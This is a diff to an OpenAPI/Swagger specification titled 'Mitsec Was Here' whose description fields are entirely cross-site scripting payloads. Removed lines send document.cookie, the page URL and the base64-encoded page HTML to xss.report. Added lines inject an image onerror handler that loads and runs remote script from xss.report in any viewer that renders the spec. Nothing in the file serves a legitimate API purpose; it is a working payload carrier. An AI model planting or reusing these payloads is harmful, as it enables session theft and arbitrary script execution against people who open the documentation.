@@ -3,17 +3,17 @@
   "info": {
     "title": "Mitsec Was Here",
     "version": "1.0",
-    "description": "<img src=x onerror=\"var s=document.createElement('script');s.src='https://YOUR_XSSHUNTER_URL/';document.head.appendChild(s)\">"
+    "description": "<img src=x onerror=\"var s=document.createElement('script');s.src='https://xss.report/c/whoami';document.head.appendChild(s)\">"
   },
   "paths": {
     "/test": {
       "get": {
-        "summary": "test",
-        "description": "<script>fetch('https://xss.report/c/whoami/?c='+document.cookie+'&u='+location.href)</script>",
+        "summary": "Security Test",
+        "description": "<img src=x onerror=\"var s=document.createElement('script');s.src='https://xss.report/c/whoami';document.head.appendChild(s)\">",
         "parameters": [],
         "responses": {
           "200": {
-            "description": "<img src=x onerror=fetch('https://xss.report/c/whoami/?dom='+btoa(document.body.innerHTML))>"
+            "description": "<img src=x onerror=\"var s=document.createElement('script');s.src='https://xss.report/c/whoami';document.head.appendChild(s)\">"
           }
         }
       }
